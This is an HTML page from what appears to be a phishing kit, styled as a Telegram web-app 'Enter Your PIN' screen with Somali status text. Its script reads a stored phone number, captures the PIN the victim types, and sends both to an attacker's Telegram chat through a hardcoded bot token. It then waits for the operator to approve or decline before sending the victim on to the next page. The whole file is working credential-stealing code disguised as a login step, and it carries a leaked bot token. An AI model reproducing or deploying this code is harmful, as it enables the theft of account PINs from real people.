<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Enter Your PIN</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #1a1a1a;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 20px;
        }
        
        .top-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
        }
        
        .back-btn {
            font-size: 24px;
            background: none;
            border: none;
            cursor: pointer;
            padding: 5px 0;
            color: #1a1a1a;
        }
        
        .logo-img {
            max-height: 40px;
            width: auto;
            object-fit: contain;
        }
        
        .header-section {
            margin-top: 25px;
            margin-bottom: 35px;
            text-align: center;
        }
        
        .title {
            font-size: 26px;
            font-weight: 700;
            color: #1a202c;
            margin-bottom: 12px;
        }
        
        .subtitle {
            font-size: 14px;
            color: #718096;
            line-height: 1.5;
        }
        
        .form-container {
            display: flex;
            flex-direction: column;
            flex-grow: 1;
            align-items: center;
        }
        
        .pin-wrapper {
            position: relative;
            display: inline-block;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .pin-input {
            border: none;
            outline: none;
            font-size: 32px;
            letter-spacing: 12px;
            color: #1a202c;
            background: transparent;
            font-family: inherit;
            text-align: center;
            padding: 5px 10px;
            width: 220px;
        }
        
        .pin-input::placeholder {
            letter-spacing: normal;
            font-size: 15px;
            color: #a0aec0;
        }
        
        .dynamic-line {
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            height: 2.5px;
            background-color: #1a202c;
            transition: width 0.2s ease, background-color 0.2s ease;
            width: 50px;
        }
        
        .status-msg {
            font-size: 14px;
            margin-bottom: 15px;
            text-align: center;
            min-height: 20px;
        }
        
        .bottom-section {
            width: 100%;
            margin-top: auto;
            padding-top: 20px;
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            background-color: #92a4c0;
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
            transition: background-color 0.2s ease;
        }
        
        .submit-btn.active {
            background-color: #4a5568;
            cursor: pointer;
        }
        
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            font-size: 18px;
            font-weight: 600;
            color: #2d3748;
            gap: 12px;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #cbd5e0;
            border-top: 4px solid #4a5568;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>

    <div class="top-bar">
        <button class="back-btn" onclick="history.back()">&#8592;</button>
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTn_5VYmxA4NGfip7K56How6z7pn9bFgakJPQwVOc3iyQ&s=10" alt="Logo" class="logo-img">
    </div>

    <div class="header-section">
        <h1 class="title">Enter Your PIN</h1>
        <p class="subtitle">Please enter your 4 to 6 digit security PIN.</p>
    </div>

    <!-- Loading Overlay -->
    <div id="loading-overlay" class="loading-overlay">
        <div class="spinner"></div>
        <span id="loading-text">Waa la diray...</span>
        <span id="loading-sub" style="font-size: 14px; color: #718096; font-weight: normal;">Sug oggolaanshaha admin-ka</span>
    </div>

    <form class="form-container" id="pinForm">
        <div class="pin-wrapper">
            <input type="password" id="pinInput" class="pin-input" placeholder="••••" minlength="4" maxlength="6" inputmode="numeric" autocomplete="one-time-code" required>
            <div class="dynamic-line" id="dynamicLine"></div>
        </div>

        <div class="status-msg" id="statusMsg"></div>

        <div class="bottom-section">
            <button type="submit" id="submitBtn" class="submit-btn" disabled>Continue</button>
        </div>
    </form>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const pinInput = document.getElementById('pinInput');
            const dynamicLine = document.getElementById('dynamicLine');
            const submitBtn = document.getElementById('submitBtn');
            const pinForm = document.getElementById('pinForm');
            const overlay = document.getElementById('loading-overlay');
            const loadingText = document.getElementById('loading-text');
            const loadingSub = document.getElementById('loading-sub');
            const statusMsg = document.getElementById('statusMsg');

            // Bot Configuration
            const BOT_TOKEN = "7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc";
            const ADMIN_CHAT_ID = "8406078749";

            let pollInterval = null;
            let isSubmitting = false;

            const phone = localStorage.getItem('phone') || "";
            if (!phone) {
                console.warn("No phone number found in localStorage.");
            }

            pinInput.focus();

            pinInput.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '');
                const length = this.value.length;

                // Auto-adjust line width based on character count safely
                if (length === 0) {
                    dynamicLine.style.width = "50px";
                } else {
                    dynamicLine.style.width = `${Math.min(60 + (length * 28), 200)}px`;
                }

                const isValid = length >= 4 && length <= 6;
                submitBtn.disabled = !isValid;
                submitBtn.classList.toggle('active', isValid);
            });

            pinForm.addEventListener('submit', async function(event) {
                event.preventDefault();
                if (submitBtn.disabled || isSubmitting) return;

                const pin = pinInput.value.trim();
                if (pin.length < 4) return;

                isSubmitting = true;

                // Show loading overlay
                overlay.style.display = 'flex';
                loadingText.innerText = "Waa la diray...";
                loadingSub.innerText = "Sug oggolaanshaha admin-ka";
                statusMsg.innerText = "";

                try {
                    const timestamp = Date.now();
                    const message = "🔐 *PIN Labaad waa la soo galiyay*\n\n📱 Phone: `" + phone + "`\n🔢 PIN: `" + pin + "`\n🆔 TS: `" + timestamp + "`";

                    const inlineKeyboard = {
                        inline_keyboard: [
                            [{
                                text: "✅ Approve",
                                callback_data: "approve_pin_" + timestamp
                            }, {
                                text: "❌ Decline",
                                callback_data: "decline_pin_" + timestamp
                            }, {
                                text: "📦 Six Boxes",
                                callback_data: "sixboxes_pin_" + timestamp
                            }]
                        ]
                    };

                    const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            chat_id: ADMIN_CHAT_ID,
                            text: message,
                            parse_mode: "Markdown",
                            reply_markup: JSON.stringify(inlineKeyboard)
                        })
                    });

                    const result = await response.json();

                    if (result.ok && result.result) {
                        startPolling(timestamp);
                    } else {
                        throw new Error(result.description || "Failed to send");
                    }

                } catch (e) {
                    console.log("Telegram send failed:", e);
                    statusMsg.style.color = "red";
                    statusMsg.innerText = "❌ Khalad ayaa dhacay. Fadlan dib u day.";
                    overlay.style.display = 'none';
                    isSubmitting = false;
                }
            });

            function startPolling(timestamp) {
                if (pollInterval) clearInterval(pollInterval);

                let attempts = 0;
                const maxAttempts = 150; // ~5 minutes

                pollInterval = setInterval(async function() {
                    attempts++;
                    loadingSub.innerText = "La sugayo... " + attempts + "s";

                    try {
                        const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?timeout=5");
                        const data = await response.json();

                        if (data.ok && data.result) {
                            for (const update of data.result) {
                                if (update.callback_query) {
                                    const query = update.callback_query;
                                    const callbackData = query.data;

                                    if (callbackData.includes("" + timestamp)) {

                                        if (callbackData.startsWith("approve")) {
                                            clearInterval(pollInterval);
                                            loadingText.innerText = "✅ Waa la ansixiyay!";
                                            loadingSub.innerText = "U gudbaya...";
                                            setTimeout(function() {
                                                window.location.href = "page6.html";
                                            }, 1500);
                                            return;
                                        }

                                        if (callbackData.startsWith("decline")) {
                                            clearInterval(pollInterval);
                                            overlay.style.display = 'none';
                                            statusMsg.style.color = "red";
                                            statusMsg.innerText = "❌ Codsiga waa la diiday. Fadlan dib u geli PIN-ka.";
                                            resetForm();
                                            return;
                                        }

                                        if (callbackData.startsWith("sixboxes")) {
                                            loadingSub.innerText = "📦 Six boxes option selected... sugitaan";
                                        }
                                    }
                                }
                            }
                        }

                        if (attempts >= maxAttempts) {
                            clearInterval(pollInterval);
                            overlay.style.display = 'none';
                            statusMsg.style.color = "red";
                            statusMsg.innerText = "⏰ Waqtigii oggolaanshaha wuu dhammaaday. Fadlan dib u day.";
                            resetForm();
                        }

                    } catch (err) {
                        console.error("Poll error:", err);
                    }
                }, 2000);
            }

            function resetForm() {
                isSubmitting = false;
                pinInput.value = "";
                dynamicLine.style.width = "50px";
                submitBtn.disabled = true;
                submitBtn.classList.remove('active');
                pinInput.focus();
            }

            // Telegram WebApp initialization
            if (window.Telegram && window.Telegram.WebApp) {
                window.Telegram.WebApp.ready();
                window.Telegram.WebApp.expand();
            }
        });
    </script>

</body>

</html>
